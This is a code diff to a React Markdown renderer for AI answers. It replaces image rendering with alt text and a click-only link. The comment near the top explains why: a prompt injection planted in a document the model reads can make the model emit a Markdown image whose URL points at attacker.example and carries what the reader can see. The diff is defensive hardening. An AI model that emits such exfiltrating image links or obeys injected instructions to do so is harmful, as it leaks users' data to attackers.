@@ -11,13 +11,42 @@
 // collapse, whitespace before trailing punctuation after a chip is
 // tightened, and tokens for documents missing from the citation list
 // stay as raw text instead of becoming broken links.
-import type { ReactNode } from 'react'
+//
+// Images never load. The answer is model output, and a prompt (including
+// one planted in a document the model reads) can make it emit
+// `![](https://attacker.example/?d=<what the reader can see>)`; an <img>
+// would send that request from the reader's browser as soon as the answer
+// renders. An image is shown as its alt text plus a plain link to the URL,
+// which only a deliberate click follows.
+import { createContext, useContext, type ReactNode } from 'react'
 import ReactMarkdown, { defaultUrlTransform } from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import remarkBreaks from 'remark-breaks'
 
 const CITATION_RE = /\[([0-9a-f-]{8,}(?::page_\d+)?)\]/gi
 const CITATION_PROTO = 'citation:'
+
+// True inside a rendered link, where an image's own link would nest an <a>
+// in an <a>; there the image is its alt text only.
+const InsideLink = createContext(false)
+
+// What a Markdown image renders as: never an <img>.
+function AnswerImage({ src, alt }: { src?: string; alt?: string }) {
+  const insideLink = useContext(InsideLink)
+  const label = alt?.trim() ?? ''
+  // `src` has already been through urlTransform: an unsafe protocol arrives
+  // as ''. A citation pseudo-URL is not a place to go.
+  const href = src && !src.startsWith(CITATION_PROTO) ? src : ''
+  if (insideLink || !href) return <>{label || null}</>
+  return (
+    <>
+      {label && <>{label} </>}
+      <a href={href} target="_blank" rel="noopener noreferrer nofollow" className="break-all underline">
+        {href}
+      </a>
+    </>
+  )
+}
 
 // Tighten a space the model leaves before trailing punctuation after a
 // citation ("[1·p1] ." → "[1·p1].").
@@ -98,10 +127,11 @@ export function AnswerMarkdown({ text, className, renderCitation, isCitation }: 
             }
             return (
               <a href={href} target="_blank" rel="noopener noreferrer" className="underline">
-                {children}
+                <InsideLink.Provider value>{children}</InsideLink.Provider>
               </a>
             )
           },
+          img: ({ src, alt }) => <AnswerImage src={typeof src === 'string' ? src : undefined} alt={alt} />,
         }}
       >
         {source}
